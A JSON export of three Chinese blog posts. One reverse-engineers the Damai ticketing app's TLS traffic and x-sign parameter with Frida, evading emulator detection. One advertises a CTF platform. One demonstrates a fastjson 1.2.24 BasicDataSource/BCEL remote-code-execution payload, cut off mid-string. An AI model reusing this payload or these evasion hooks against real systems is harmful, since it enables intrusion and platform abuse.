[{"title":"某麦app抓包解析","url":"/prog/2025/08/b005485c0269/","content":"\n# 免责声明\n\n本文所述内容**仅限技术研究与学习交流**，作者及发布平台**明确声明**：\n\n1. **禁止非法用途**\n    您对本文的任何操作、修改或实施，**不得用于**：\n\n    - 绕过任何平台安全机制\n    - 干扰正常网络服务\n    - 触犯《网络安全法》《反不正当竞争法》等法律法规的行为\n\n    \n\n2. **责任完全归属使用者**\n    **您基于本文进行的所有行为，均视为您的个人决定**。\n\n    - 由此导致的**账号封禁、财产损失、行政处罚或刑事责任**，\n    - 以及**侵犯第三方合法权益**（如平台、用户、开发者）的后果，\n        **均由您自行承担**，与作者及发布平台**无任何法律关联**。\n\n    \n\n3. **技术中立原则**\n    本文仅探讨技术原理，**不评价、不鼓励、不支持**任何可能违法的实践。\n    技术本身无罪，但**滥用技术即违法**，请务必遵守：\n\n    > 《网络安全法》第27条：任何个人不得从事危害网络安全的活动\n    > 《计算机软件保护条例》第17条：技术研究不得影响软件正常运行 \n\n4. **最后警示**\n    **阅读即视为您承诺**：\n    ✅ 仅将技术用于合法授权场景\n    ✅ 主动规避法律风险\n    ✅ 为自身行为承担全部后果\n\n\n\n# 过模拟器检测\n\n我用的是蓝叠模拟器（我本地用的雷电/mumu/逍遥/夜神都在提交登录/获取票务这些关键接口被拦死了，做了过检测也会被拦，这个应该是我个人技术问题，厉害的大佬可以自己试试），具体的操作流程参考视频：[点这里](https://www.bilibili.com/video/BV1u7oMYXEGM/?spm_id_from=333.788.recommend_more_video.8&vd_source=e2033e04a3e3a8918cc9e88278f116be)\n\n\n\n我说一下我踩的坑：\n\n蓝叠模拟器在安装面具的时候会报错只读的文件系统，无法安装，提示类似：read-only filesystem，Permission Denied这种。参考这篇文章来改：[BlueStacks重载system分区 | 剑网3冷酷鲨手](http://zhishui.cc/article/2024/10/25/29.html)\n\n> 改了之后重启模拟器了还是没办法写入的话，关掉模拟器再改一次，改完重启电脑，重启电脑后再去要改的文件里看。参数对了启动模拟器即可\n\n# 抓包\n\n抓包分两个方面，我下面会进行分类讲解\n\n{% tabs 抓包 %}\n\n<!--tab 实时抓包-->\n\n动态查看包数据方面，可以使用Charles/fiddler等抓包工具，通过向模拟器中写入根证书的方式进行抓包，具体操作如下：\n\n\n\n> 抓包工具：Charles（破解方法在这里：[Charles永久免费破解方法 - 哈哈妞儿 - 博客园](https://www.cnblogs.com/hahaniuer/p/17915980.html)）\n>\n> 证书工具：[openssl](https://slproweb.com/download/Win64OpenSSL-3_5_2.exe) 点这个工具名就可以下载了，不用跑去官网找\n\n安装证书参考文章：[MuMu模拟器安卓12安装证书_mumu模拟器安装证书-CSDN博客](https://blog.csdn.net/m0_58630014/article/details/140867877)\n\n> 如果用fiddler导出的证书是der/cer类型的，看这篇文章改：[Android不信任证书导致无法抓包的解决办法 - 吾爱破解 - 52pojie.cn](https://www.52pojie.cn/thread-1679128-1-1.html)\n\n这里为节省时间不过多展示操作流程。\n\n> 1. 再强调一下，只抓手机包的话，charles在Proxy->Windows proxy那里关了就行；fiddler在开启抓包的我时候把左下角的captrue那个小玩意点白就行（反正不显示给你看到就可以了）\n>\n> 2. 路径找的麻烦看这里：\n>\n>     ```\n>     mv /storage/emulated/0/DCIM/SharedFolder/你的证书文件  /etc/security/cacerts/你的证书文件\n>     ```\n>\n>     \n\n\n\n导入证书后，在终端设置一下代理：\n\n```shell\nadb shell\nsettings put global http_proxy ip:8888（这里用宿主机的局域网IP，端口根据你的抓包工具端口来改就行）\n```\n\n\n\n![image-20250813070706874](image-20250813070706874.png)\n\n具体抓到的包如下：\n\n![image-20250813074033946](image-20250813074033946.png)\n\n\n\n> 要是APP闪退了，按照上面教程弄了过检测的，重置APP数据就可以重新打开和使用了\n\n<!--endtab-->\n\n\n\n<!--tab 静态抓包分析 -->\n\n抓全流程的包就用小鲨鱼+hook的方式来抓，这个方法抓包的优势是，可以逗弄一遍接口，再仔细分析，同时可以分析一些加密的请求参数，实时的就不行（我技术原因，没摸索出来）\n\n小鲨鱼抓包的话，软件在这里下：\n\n[Wireshark v4.4.8 便携版 - 果核剥壳](https://www.ghxi.com/wireshark.html)\n\n\n\nhook是为了后面解包用的，别漏了这一步，不然你抓什么都白费：\n\n\n\nfrida在这里下：[Releases · frida/frida](https://github.com/frida/frida/releases)\n\n下的是frida-server，别下错了。\n\n\n\n下好后，也是弄到模拟器里：\n\n![image-20250813075200612](image-20250813075200612.png)\n\n\n\n然后去终端里面把文件移一下（不然没法改权限跑）\n\n```shell\nmv /storage/emulated/0/DCIM/SharedFolder/frida-server /data/local/frida-server\n```\n\n\n\n再加个运行权限\n\n```shell\ncd /data/local/\nchmod +x frida-server\n```\n\n\n\n最后运行：\n\n```shell\n./frida-server & \n```\n\n\n\n如图：\n\n![image-20250813075445457](image-20250813075445457.png)\n\n\n\n运行完成后，下个termux（没弄上面过检测的下一下，弄过了就不用下这玩意），链接我放这里：[Release v0.118.3 · termux/termux-app](https://github.com/termux/termux-app/releases/tag/v0.118.3)\n\n根据模拟器的型号自己下。\n\n下好后装一下：\n\n![image-20250813080022230](image-20250813080022230.png)\n\n\n\n装好之后，三部曲：换源，装载文件夹，下tcpdump：\n\n```shell\n（在termux里操作）\ntermux-change-repo\n```\n\n\n\n![image-20250813080213115](image-20250813080213115.png)\n\n![image-20250813080258941](image-20250813080258941.png)\n\n![image-20250813080345882](image-20250813080345882.png)\n\n\n\napt更新一下\n\n```shell\napt list --upgradable\n```\n\n\n\n![image-20250813080426520](image-20250813080426520.png)\n\n\n\n接下来下载root源以及对应软件\n\n```shell\npkg install root-repo\n\npkg install sudo tcpdump\n```\n\n\n\n![image-20250813080609634](image-20250813080609634.png)\n\n\n\n下完了就跑命令抓包了：\n\n```shell\nsudo tcpdump -i any -s 0 -w ~/storage/downloads/capture.pcap\n```\n\n\n\n出现和我差不多问题的就下tsu：\n\n![image-20250813080827452](image-20250813080827452.png)\n\n\n\n命令放这：\n\n```shell\npkg install tsu\n```\n\n\n\n运行完出现下面这个玩意就运行成功了：\n\n![image-20250813081047471](image-20250813081047471.png)\n\n\n\n接下来搞客户端\n\n\n\n宿主机的python下一个frida-tools\n\n```python\nuv add frida-tools （用uv控制python的用这个）\npip install frida-tools （pip用这个）\n```\n\n\n\n![image-20250813081131483](image-20250813081131483.png)\n\n\n\n下好之后测试一下：\n\n```shell\nfrida-ps -U\n```\n\n显示模拟器里的软件就算是连接成功了：\n\n![image-20250813084649152](image-20250813084649152.png)\n\n\n\n接下来需要抓取对应的sslkey即可：\n\nhook脚本如下：\n\n```javascript\nfunction startTLSKeyLogger(SSL_CTX_new, SSL_CTX_set_keylog_callback) {\n    console.log(\"start----\")\n    \n    function keyLogger(ssl, line) {\n        // 添加空指针检查\n        if (line.isNull()) {\n            console.log(\"Warning: line pointer is null\");\n            return;\n        }\n        try {\n            console.log(new NativePointer(line).readCString());\n        } catch (e) {\n            console.log(\"Error reading string:\", e.message);\n        }\n    }\n    \n    const keyLogCallback = new NativeCallback(keyLogger, 'void', ['pointer', 'pointer']);\n    \n    Interceptor.attach(SSL_CTX_new, {\n        onLeave: function(retval) {\n            if (retval.isNull()) {\n                console.log(\"SSL_CTX_new returned null\");\n                return;\n            }\n            const ssl = new NativePointer(retval);\n            const SSL_CTX_set_keylog_callbackFn = new NativeFunction(SSL_CTX_set_keylog_callback, 'void', ['pointer', 'pointer']);\n            SSL_CTX_set_keylog_callbackFn(ssl, keyLogCallback);\n        }\n    });\n}\n\n// 添加模块和函数存在性检查\ntry {\n    const sslModule = Process.getModuleByName('libssl.so');\n    const sslCtxNew = sslModule.getExportByName('SSL_CTX_new');\n    const sslCtxSetKeylog = sslModule.getExportByName('SSL_CTX_set_keylog_callback');\n    \n    if (sslCtxNew && sslCtxSetKeylog) {\n        startTLSKeyLogger(sslCtxNew, sslCtxSetKeylog);\n    } else {\n        console.log(\"Required SSL functions not found\");\n    }\n} catch (e) {\n    console.log(\"libssl.so module not found:\", e.message);\n}\n```\n\n\n\n\n\n运行脚本：\n\n```shell\nfrida -U -l .\\sslkeyfilelog.js  -f cn.damai\n```\n\n\n\n显示key就是运行成功了：\n\n![image-20250813085054637](image-20250813085054637.png)\n\n\n\n接下来就是走流程\n\n\n\nkey存到一个文件里：\n\n![image-20250813090116800](image-20250813090116800.png)\n\n\n\n把tcpdump停了之后，导出来文件。\n\n\n\n\n\n先设置小鲨鱼\n\n\n\n在设置里，找到Protols里面的tls，再进行ssl的文件配置：\n\n![image-20250813090606885](image-20250813090606885.png)\n\n\n\n设置完成后打开导出来的抓包文件\n\n\n\n过滤一下：\n\n```\nhttp && tcp.dstport==443 and !(http.request.uri contains \".webp\" or http.request.uri contains \".jpg\" or http.request.uri contains \".png\")\n```\n\n\n\n就能显示看到下面的内容：\n![image-20250813093525876](image-20250813093525876.png)\n\n\n\n\n\n<!--endtab-->\n\n\n\n剩下的主要包自己走流程抓就行了\n\n\n\n{% endtabs %}\n\n\n\n\n\n# 关键参数获取\n\n下面这个几个玩意，是接口必备的：\n\n![image-20250813093751787](image-20250813093751787.png)\n\n\n\n接着hook一下，这个时候用frida-trace来弄就行，举个例子x-sign：\n\n\n\n```shell\nfrida-trace -U -j \"*InnerSignImpl!getUnifiedSign\" 懂的都懂\n```\n\n\n\n![image-20250813094155671](image-20250813094155671.png)\n\n\n\n点几个地方生成一下：\n\n![image-20250813102231458](image-20250813102231458.png)\n\n\n\n目前就搞了这么多，有大佬继续搞的话，可以交流交流。\n\n\n\n> 我自己有搞了个监控的系统，不过是基于的，目前还在慢慢摸索和迭代，截图如下：\n>\n> ![image-20250813102742769](image-20250813102742769.png)\n>\n> 目前只能查是不是在卖，是不是有这个票，其他的都没实现，等着更新。\n\n有兴趣可以加群订阅系统和讨论：\n\n![993dea653a6bdf5cd2e93f751a001710](993dea653a6bdf5cd2e93f751a001710.jpg)\n\n# 免责声明\n\n仅供学习哈，出了事跟我无关\n\n\n\n\n\n# 参考链接\n\n[安卓逆向之 某麦-演唱会系列(最新版本)_大麦逆向-CSDN博客](https://blog.csdn.net/ifccod/article/details/147460965)\n\n[意外发现的Android硬核https抓包， 在多个app亲测ok , 自定义ssl也无用哦~ - 吾爱破解 - 52pojie.cn](https://www.52pojie.cn/thread-1405917-1-1.html)\n\n[Android不信任证书导致无法抓包的解决办法 - 吾爱破解 - 52pojie.cn](https://www.52pojie.cn/thread-1679128-1-1.html)\n\n[MuMu模拟器安卓12安装证书_mumu模拟器安装证书-CSDN博客](https://blog.csdn.net/m0_58630014/article/details/140867877)\n\n[BlueStacks重载system分区 | 剑网3冷酷鲨手](http://zhishui.cc/article/2024/10/25/29.html)\n\n[Android逆向\\] 某麦网APK抢票接口加密参数分析 - jack***0 - 博客园](https://www.cnblogs.com/damaidamai/articles/18103810)\n\n\n\n感谢大佬们的文章！\n\n\n\n","tags":["app逆向","某麦app抓包","开发"],"categories":["prog"]},{"title":"云麒火翎网络安全竞赛平台（单机版）","url":"/products/2025/05/eb16ed253297/","content":"\n# 前言\n\n你还在为培训没有比赛平台而困扰吗？你还在为市面开源的平台过于简陋、功能稀缺而困扰吗？或许，云麒火翎网络安全综合攻防竞赛平台可以给你答案！\n\n# 靶场的特点和功能\n\n云麒火翎网络安全综合竞赛平台是一个综合性的平台，包含了平台靶场搭建、网络对抗环境、内置题库、培训服务等多个方面，云麒火翎安全靶场提供的服务可以让用户更好地了解网络安全攻防知识，提高信息安全意识，提高自我保护能力，催生网络安全领域新的人才。\n\n云麒火翎网络安全综合竞赛平台拥有最接近实战的攻防环境（来自BugScan社区的漏洞插件、来自安全服务团队的渗透经验），10年专家级渗透测试经验分析，7000+的漏洞素材。\n\n丰富的CTF出题经验与题目环境（成功举办历届攻防比赛、平台基本包括出现过的CTF的题目环境），1000+网络安全基题库，300+CTF题目。\n\n可构建符合业务需求的仿真环境（网络拓扑环境＋网络业务仿真），10+攻防大赛的决赛环境，20+各类业务系统仿真\n\n补：所涵盖课程及靶场题库根据业内赛事及最新漏洞实时更新环境。\n\n## 功能列表\n\n### CTF，夺旗赛训练\n\n\\* 靶场练习：它提供了各种不同类型的靶场练习，如web、二进制、逆向、密码破解、网络取证、漏洞利用等，用户可以选择适合自己的练习类型，进行实践演练。\n\n\\* 竞赛模式：它支持单人、团队、对抗等多种竞赛模式，用户可以在进行实战训练的同时，学习竞赛经验，提升自己的实战能力。\n\n\\* 自定义练习：用户可以选择自己喜欢的练习题目进行练习，并可以根据自己的需要进行自定义调整，提高练习的效率和成果。\n\n\\* 难度递进：靶场练习的难度从简单到复杂，有着递进式的增加，帮助用户逐渐提升自己的技能水平。\n\n\\* 实时评估：它支持实时评估，用户可以在练习过程中得到实时的反馈和评估，帮助用户及时调整自己的操作方式。\n\n### CTF，夺旗赛比赛\n\n\\* 竞赛模式：它支持个人赛、团队赛和对抗赛等多种竞赛模式，参赛者可以根据自己的喜好和实际需求选择不同的比赛形式。\n\n\\* 靶场挑战：它提供了各种具有挑战性的网络攻防场景，参赛者需要通过分析漏洞，利用漏洞，获取旗帜等方式来完成任务，切实提高参赛者的实战能力。\n\n\\* 实时排名：它支持实时排名功能，可以实时显示参赛者的得分和排名情况，方便参赛者随时了解自己和其他对手之间的竞争情况。\n\n\\* 自定义规则：比赛主办方可以根据实际需要自定义比赛规则，包括比赛时间、分数计算方式、出题数量等等，以适应不同场合和不同需求的比赛。\n\n\\* 安全可靠：比赛靶场的安全性非常高，参赛者可以放心进行攻防演练，不用担心遭受任何安全威胁。\n\n### AWD，攻防兼备\n\n\\* 攻防并重：AWD攻防兼备靶场是一个攻防并重的平台，它要求参赛者既要具有攻击能力，又要具有防守能力，这样可以更好地锻炼参赛者的技能，同时也可以让参赛者全面了解网络安全的各个方面。\n\n\\* 多种攻击方式：AWD攻防兼备靶场支持多种攻击方式，如web渗透、二进制漏洞、移动设备漏洞等等，这些攻击方式都非常具有挑战性，需要参赛者掌握多种技术才能成功。\n\n\\* 实时排名：它支持实时排名功能，可以实时显示参赛者的得分和排名情况，方便参赛者随时了解自己和其他对手之间的竞争情况。\n\n\\* 自定义规则：比赛主办方可以根据实际需要自定义比赛规则，包括比赛时间、分数计算方式等等，以适应不同场合和不同需求的比赛。\n\n\\* 安全可靠：AWD攻防兼备靶场的安全性非常高，参赛者可以放心进行攻防演练，不用担心遭受任何安全威胁。\n\n### 后台管理\n\n\\* 用户管理：可以创建和管理用户账户，并设置对应的权限和角色。\n\n\\* 数据统计：可以对网站的流量、用户活动、订单等数据进行实时监控和分析，以便更好地了解业务情况和做出决策。\n\n\\* 内容管理：可以添加、编辑和删除网站的各种内容，包括文章、图片、视频等，并对其进行分类和标签管理。\n\n### 态势展示功能\n\n比赛过程中通过态势展现的形式向观众展示比赛的全部过程，包括基础理论、夺旗闯关、主机渗透、攻防对抗、取证溯源、企业环境渗透、安全加固、自定义竞赛八种不同模式的态势展示，每中模式都会显示各阶段中各队的答题情况以及分数和排行，方便观众及时了解竞赛的战况。\n\n## 功能指标\n\n### CTF（Capture The Flag夺旗赛）\n\n#### 动态分值\n\n分数随着做出的人越多越低，并且也会降低之前已经做出该题的人的分数\n\n####  个人数据统计 \n\n\n\n#### 排行分析\n\n#### 统计选手擅长的方向和题目标签类型\n\n# 靶场的特点和功能\n\n云麒火翎网络安全综合竞赛平台是一个综合性的平台，包含了平台靶场搭建、网络对抗环境、内置题库、培训服务等多个方面，云麒火翎安全靶场提供的服务可以让用户更好地了解网络安全攻防知识，提高信息安全意识，提高自我保护能力，催生网络安全领域新的人才。\n\n云麒火翎网络安全综合竞赛平台拥有最接近实战的攻防环境（来自BugScan社区的漏洞插件、来自安全服务团队的渗透经验），10年专家级渗透测试经验分析，7000+的漏洞素材。\n\n丰富的CTF出题经验与题目环境（成功举办历届攻防比赛、平台基本包括出现过的CTF的题目环境），1000+网络安全基题库，300+CTF题目。\n\n可构建符合业务需求的仿真环境（网络拓扑环境＋网络业务仿真），10+攻防大赛的决赛环境，20+各类业务系统仿真\n\n补：所涵盖课程及靶场题库根据业内赛事及最新漏洞实时更新环境。\n\n## 功能列表\n\n### CTF，夺旗赛训练\n\n\\* 靶场练习：它提供了各种不同类型的靶场练习，如web、二进制、逆向、密码破解、网络取证、漏洞利用等，用户可以选择适合自己的练习类型，进行实践演练。\n\n\\* 竞赛模式：它支持单人、团队、对抗等多种竞赛模式，用户可以在进行实战训练的同时，学习竞赛经验，提升自己的实战能力。\n\n\\* 自定义练习：用户可以选择自己喜欢的练习题目进行练习，并可以根据自己的需要进行自定义调整，提高练习的效率和成果。\n\n\\* 难度递进：靶场练习的难度从简单到复杂，有着递进式的增加，帮助用户逐渐提升自己的技能水平。\n\n\\* 实时评估：它支持实时评估，用户可以在练习过程中得到实时的反馈和评估，帮助用户及时调整自己的操作方式。\n\n### CTF，夺旗赛比赛\n\n\\* 竞赛模式：它支持个人赛、团队赛和对抗赛等多种竞赛模式，参赛者可以根据自己的喜好和实际需求选择不同的比赛形式。\n\n\\* 靶场挑战：它提供了各种具有挑战性的网络攻防场景，参赛者需要通过分析漏洞，利用漏洞，获取旗帜等方式来完成任务，切实提高参赛者的实战能力。\n\n\\* 实时排名：它支持实时排名功能，可以实时显示参赛者的得分和排名情况，方便参赛者随时了解自己和其他对手之间的竞争情况。\n\n\\* 自定义规则：比赛主办方可以根据实际需要自定义比赛规则，包括比赛时间、分数计算方式、出题数量等等，以适应不同场合和不同需求的比赛。\n\n\\* 安全可靠：比赛靶场的安全性非常高，参赛者可以放心进行攻防演练，不用担心遭受任何安全威胁。\n\n### AWD，攻防兼备\n\n\\* 攻防并重：AWD攻防兼备靶场是一个攻防并重的平台，它要求参赛者既要具有攻击能力，又要具有防守能力，这样可以更好地锻炼参赛者的技能，同时也可以让参赛者全面了解网络安全的各个方面。\n\n\\* 多种攻击方式：AWD攻防兼备靶场支持多种攻击方式，如web渗透、二进制漏洞、移动设备漏洞等等，这些攻击方式都非常具有挑战性，需要参赛者掌握多种技术才能成功。\n\n\\* 实时排名：它支持实时排名功能，可以实时显示参赛者的得分和排名情况，方便参赛者随时了解自己和其他对手之间的竞争情况。\n\n\\* 自定义规则：比赛主办方可以根据实际需要自定义比赛规则，包括比赛时间、分数计算方式等等，以适应不同场合和不同需求的比赛。\n\n\\* 安全可靠：AWD攻防兼备靶场的安全性非常高，参赛者可以放心进行攻防演练，不用担心遭受任何安全威胁。\n\n### 后台管理\n\n\\* 用户管理：可以创建和管理用户账户，并设置对应的权限和角色。\n\n\\* 数据统计：可以对网站的流量、用户活动、订单等数据进行实时监控和分析，以便更好地了解业务情况和做出决策。\n\n\\* 内容管理：可以添加、编辑和删除网站的各种内容，包括文章、图片、视频等，并对其进行分类和标签管理。\n\n### 态势展示功能\n\n比赛过程中通过态势展现的形式向观众展示比赛的全部过程，包括基础理论、夺旗闯关、主机渗透、攻防对抗、取证溯源、企业环境渗透、安全加固、自定义竞赛八种不同模式的态势展示，每中模式都会显示各阶段中各队的答题情况以及分数和排行，方便观众及时了解竞赛的战况。\n\n## 功能指标\n\n### CTF（Capture The Flag夺旗赛）\n\n#### 动态分值\n\n分数随着做出的人越多越低，并且也会降低之前已经做出该题的人的分数\n\n####  个人数据统计\n\n\n\n![image-20250509005221978](image-20250509005221978.png)\n\n#### 排行分析\n\n![image-20250509005453219](image-20250509005453219.png)\n\n#### 竞赛公告\n\n![image-20250509005511314](image-20250509005511314.png)\n\n#### 对CTF的全方面支持\n\n选手端\n\n![image-20250509005525030](image-20250509005525030.png)\n\n管理端\n\n![image-20250509005534190](image-20250509005534190.png)\n\n#### 初始化靶机秘钥\n\n靶场中，参赛队伍可以提交找到的flag，获得相应的分数和排名。同时，管理员可以发布一些重要的公告，让参赛队伍及时了解比赛动态。还可以通过排名分析功能，对各个队伍的表现进行分析和比较，有助于发现问题和做出优化。另外，在队伍靶机管理模块中，管理员可以方便地设置和管理每个队伍所属的靶机资源。当队伍需要访问自己的靶机时，可以通过靶机远程登录功能进行操作。此外，初始化靶机秘钥可以方便地加密和保护靶机的数据安全性。\n\n#### 态势大屏\n\n![image-20250509005546544](image-20250509005546544.png)\n\n#### 靶场后台\n\n可以对参赛队伍在比赛中的表现进行全面的监控和分析。管理员可以通过靶机攻击次数统计、攻破率统计等功能，追踪每个队伍的攻击情况和成功率，并加以评估和排名。同时，题目攻击分析和队伍正确率分析可以通过对队伍攻击数据的挖掘和展示，帮助管理员发现参赛队伍的弱点和优势，作出更有针对性的指导和建议。\n\n![image-20250509005557977](image-20250509005557977.png)\n\n#### 题目管理\n\n![image-20250509005610935](image-20250509005610935.png)\n\n#### 选手数据分析\n\n![image-20250509005618025](image-20250509005618025.png)\n\n#### 管理页面\n\n![image-20250509005627698](image-20250509005627698.png)\n\n#### 多flag积分管理\n\n# 配套课程及服务\n\n云麒火翎网络安全综合竞赛平台结合数字化转型提出新型网络安全体系建设的思路和方法，课程深入探讨此思路和方法在行业中的应用和实践，并将这样的理念贯穿课程设计体系。依照这样的思路和方法，学员将更加明确网络安全与信息化相融合的思路。\n\n## 靶场安全培训：\n\n针对顶尖安全专家与安全研究员提供的解决方案，我们将在建设项目移交给用户运行前对最终用户进行相关的技术培训，此外，每次的系统升级或者根据用户的要求，我们将提供不定期的技术培训服务。该类技术培训主要分为以下部分：\n\n1)  系统管理用户培训：针对系统日常管理、维护、安装进行培训，培训对象为技术管理人员，内容为系统常见技术问题处理方式等。\n\n## 优势对比\n\n| 功能               | 开源方案       | 现有企业方案                                            | IrinaGame                             |\n| ------------------ | -------------- | ------------------------------------------------------- | ------------------------------------- |\n| 公共CTF靶场        | 静态部署       | 动态/静态部署                                           | 动态/静态部署                         |\n| 班级/团队私有题库  | ×              | ×                                                       | √                                     |\n| 教师在线自定义题目 | ×              | ×                                                       | √                                     |\n| 公共CTF竞赛        | 非集成         | 非集成                                                  | √                                     |\n| 公共AWD            | 一次性静态部署 | 非集成                                                  | √                                     |\n| 内网渗透           | ×              | 静态化题目，非集成，配置繁琐                            | 可视化自定义内网结构+内置50道内网题目 |\n| 内网结构           | ×              | 编写docker compose，难以完成复杂网络搭建                | 16层内网+32台服务器的可视化拓扑编辑   |\n| 班级/团队私有渗透  | ×              | ×                                                       | √                                     |\n| 教学模块           | ×              | 单独模块                                                | 由CTF实训模块赋能                     |\n| 班级/团队私有课程  | ×              | ×                                                       | √                                     |\n| 服务器配置         | 单机           | 大多采用单机，少数大型比赛采用k8s等开源方案             | 自研kisara分布式架构                  |\n| OJ                 | 非集成         | 非集成，大部分CTFer代码能力较弱，无非独立编写较复杂代码 | √                                     |\n| 社区环境           | ×              | ×                                                       | √                                     |\n\n## 售后技术服务\n\n顶尖安全专家与安全研究员组建了一支专业的售后技术服务队伍，这支队伍包括网络工程师、安全工程师、系统工程师等，他们负责进行用户项目的现场实施，同时接受用户系统日常运行过程中的技术咨询和维护服务。顶尖安全专家与安全研究员的售后服务可以做到：\n\n\\(1\\) 协助计划\n\n在项目实施之前，售后（售前）技术服务人员向用户提供项目实施的前提条件，包含网络环境要求、软硬件要求等。\n\n对于用户购买的硬件和软件，在设备到达安装现场之后，售后技术人员将协助用户进行设备的安装、调试及验收。\n\n\\(2\\) 现场服务\n\n根据用户需求及合同规定的时间，售后技术人员将在用户现场进行项目实施，包含软硬件设备的安装、调试及验收，帮助用户顺利掌握系统，尽量减少项目实施周期，实现系统的无缝交接。\n\n对由于硬件质量问题造成的硬件损坏，如在保修期内或与我方兼有相关的技术服务合同的，顶尖安全专家与安全研究员将提供现场服务，维修更换相应的硬件。对有效合同内的软件故障，用户应将故障现象及出错信息通过电邮、信件或传真等通知我们，我方根据故障等级做出不同时间级别的相应，并给予解答。不能远程解决问题时，我方将派技术人员到达用户现场进行实地解决。\n\n(3)热线支持\n\n顶尖安全专家与安全研究员提供全天热线技术支持，包括电子邮件、电话、传真等方式（7×24 小时）。全天热线技术支持体系，可使我们的用户最短时间内，快捷方便的得到顶尖安全专家与安全研究员的技术咨询及服务。\n\n\n\n# 联系方式\n\n\n\nQQ：1605793838\n\n微信：mimicrity\n","tags":["CTF平台","网络安全实训平台","攻防竞赛平台","AWD平台"],"categories":["products"]},{"title":"fastjson漏洞不出网利用","url":"/stcs/2023/07/5dfcbb92c2c0/","content":"\n# 前言\n\n在进入主题前，先分析一下fastjson公开的三条利用链：\n\n1. JNDI(JdbcRowSetImpl)\n   - 攻击类：`com.sun.rowset.JdbcRowSetImpl`\n   - 优点：实战可以利用，JDNI注入基于较低版本的JDK，LDAP适用范围更广\n   - 缺点：必须出网加载远程的恶意字节码，有一定的局限性\n\n2. TemplateImpl\n\n   - 攻击类：`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`\n   - 优点：TemplatesImpl类是Java反序列化界比较常用的类，更容易理解和上手\n   - 缺点：需要开启`Feature.SupportNonPublicField`，实战中不适用\n\n3. BasicDataSource\n\n   - 攻击类：\n\n     - tomcat8或以上：`org.apache.tomcat.dbcp.dbcp2.BasicDataSource`\n\n     - tomcat8以下：`org.apache.tomcat.dbcp.dbcp.BasicDataSource`\n\n   - 优点：不需要出网，不需要开启特殊的参数，适用范围较广\n\n   - 缺点：需要有tomcat的依赖\n\n# 什么是BCEL\n\nBCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，BCEL库提供了一系列用于分析、创建、修改Java Class文件的API.\n\n这里不做过多解释，具体介绍请参考文章：https://blog.csdn.net/evasnowind/article/details/100727903\n\n# BCEL使用\n\nBCEL这个包中有个ClassLoder的类，它重写了Java内置的`ClassLoader#loadClass()`方法。 在`ClassLoader#loadClass()`中，会判断类名是否是`$$BCEL$$`开头，如果是的话，将会对这个字符串进行解码。可以理解为是传统字节码的HEX编码，再将反斜线替换成`$`。默认情况下外层还会加一层GZip压缩。\n\n我们可以构造以下的代码来初步使用和体验BCEL：\n\n{% tabs Eval.java %}\n\n<!--tab Eval.java-->\n\n编写一个执行命令的类\n\n```java\nimport java.lang.Runtime;\npublic class Eval {\n    static {\n        try{\n            Runtime.getRuntime().exec(\"calc\");\n        }catch (Exception e){\n\n        }\n    }\n}\n```\n\n<!--endtab-->\n\n<!--tab Main.java-->\n\n这里使用BCEL提供的`Repository`类将一个JavaClass先转换成字节码(编译)，再使用`Utility`类将原生的字节码转换成BCEL字节码\n\n```java\nimport com.sun.org.apache.bcel.internal.Repository;\nimport com.sun.org.apache.bcel.internal.classfile.JavaClass;\nimport com.sun.org.apache.bcel.internal.classfile.Utility;\nimport com.sun.org.apache.bcel.internal.util.ClassLoader;\n\nimport java.io.IOException;\n\npublic class Main {\n    public static void main(String[] args) throws IOException, ClassNotFoundException {\n        JavaClass javaClass = Repository.lookupClass(Eval.class);\n        String encodeStr = Utility.encode(javaClass.getBytes(), true);\n        System.out.println(encodeStr);\n        Class.forName(\"$$BCEL$$\" + encodeStr, true, new ClassLoader());\n    }\n}\n```\n\n<!--endtab-->\n\n{% endtabs %}\n\n运行后，会正常执行Eval类的代码。\n\n![image-20230719201958847](image-20230719201958847.png)\n\n\n\n# fastjson漏洞利用\n\n看到这里可能会有疑问：上面说了这么多BCEL，那和BasicDataSource有什么关系呢？其实是有的，在分析代码之前，先在代码中导入tomcat的依赖，因为BasicDataSource是依赖于tomcat的。先导入maven的依赖\n\n```xml\n    <dependencies>\n        <dependency>\n            <groupId>com.alibaba</groupId>\n            <artifactId>fastjson</artifactId>\n            <version>1.2.24</version>\n        </dependency>\n        <dependency>\n            <groupId>org.apache.tomcat</groupId>\n            <artifactId>tomcat-dbcp</artifactId>\n            <version>8.0.36</version>\n        </dependency>\n    </dependencies>\n```\n\n代码如下：\n\n```java\nimport com.alibaba.fastjson.JSON;\n\npublic class Test {\n    public static void main(String[] args) {\n        String payload = \"{\\n\" +\n                \"    {\\n\" +\n                \"        \\\"payload\\\": {\\n\" +\n                \"                \\\"@type\\\": \\\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\\\",\\n\" +\n                \"                \\\"driverClassLoader\\\": {\\n\" +\n                \"                    \\\"@type\\\": \\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"\\n\" +\n                \"                },\\n\" +\n                \"                \\\"driverClassName\\\": \\\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$C1$U$3d$85$91a$c6Ae$f0$fdf$r$b8$90$8d$3b$8c$h$83$h$c7G$c4$e8$ba$d4$G$ab$c3$8c$Z$K$e1$8f$5c$b3Q$e3$c2$P$f0$a3$8c$b7$95$a8$89Mzo$eey$dd$a6$l$9fo$ef$A$f6Q$f5$e1b$de$c7$C$W$8bX2$7d$d9$c5$8a$8bU$Xk$M$85$D$95$u$7d$c8$90$af$d5$af$Z$9c$a3$f4V2$ccF$w$91g$83$5eGfW$bc$T$T$SF$a9$e0$f15$cf$94$99$t$a0$a3$efT$9f2$a2$d6$90$c7M$86$e2$81$88$tq$a5$b6$e6$e2$e1$94$3fZ$v$zd$f0$db$e9$m$T$f2X$Z$abg$y$7b$f7$7c$c8$D$U$e1$b9X$P$b0$81M$ca$a45$o$c0$W$b6$Z$w$86o$c4$3c$e96Z$p$n$l$b5J$TR$Y$x$c3$dc$_y$de$b9$97B3$94$7f$a1$cbA$a2U$8f$W$f9$5d$a9$7f$86$85Z$3d$fa$a7$a1$87$3br$q$F$c3N$ed$P$db$d6$99J$ba$cd$bf$86$8b$y$V$b2$dfo$a2$8a$C$7d$aa990$f3$7e$aa$3eM$N$ea$8c$fa$d4$ee$L$d8$d8$d2$d3T$L$W$cc$n$a0$g$7c$LP$c2$M$f5$of$7f$cc$e76$M$98yE$$$cc$3f$c3$b9y$82s2$b6$98G$be$v$e4mZ$I$c7$sx$e4$O$u$bbdY$93$P$cc$d1u$91$8b$5c$94A$c6$d0$c2$95$_$5c$bcr$b